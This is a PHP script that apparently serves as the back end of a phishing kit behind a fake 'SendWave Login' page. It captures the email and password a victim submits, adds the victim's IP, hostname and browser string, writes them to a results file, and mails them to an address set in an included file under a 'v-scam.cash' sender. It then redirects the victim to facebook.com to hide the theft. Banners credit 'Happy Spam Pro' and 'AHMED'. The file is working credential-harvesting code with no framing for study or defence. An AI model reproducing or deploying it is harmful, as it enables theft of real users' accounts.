<?php

$ip = getenv("REMOTE_ADDR");
$hostname = bin2hex ($_SERVER['HTTP_HOST']);
include './email.php';
	
	 $zabi = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$hostname = gethostbyaddr($zabi);

$hi.= "------------------[ ✔ SendWave Login ✔ ]------------------\n";
$hi.= "------------------[ Happy Spam Pro]---------------\n";
$hi.= "Email              : ".$_POST['uname']."\n";
$hi.= "Password     : ".$_POST['psw']."\n";
$hi.= "-------------------[ IP Information ]-------------------\n";
$hi.= "IP      : $ip\n";
$hi.= "HOST    : ".gethostbyaddr($ahmed)."\n";
$hi.= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$hi.= "------------------[ Adress & Date ]-------------------\n";
$hi.= "IP: ".$zabi."\n";
$hi.= "Country: ".$country."\n";
$hi.= "Date: ".$adddate."\n";
$hi.= "HostName : ".$hostname."\n";
$hi.= "---------------------- [ 😈 All Created By AHMED 😈] ----------------------\n";
		$save=fopen("rezlt-here".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);


    $headers = "From: FB LOG ♊ <news@v-scam.cash>";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	 @mail($email,$subject,$hi,$headers);
header("Location: https://facebook.com");


?>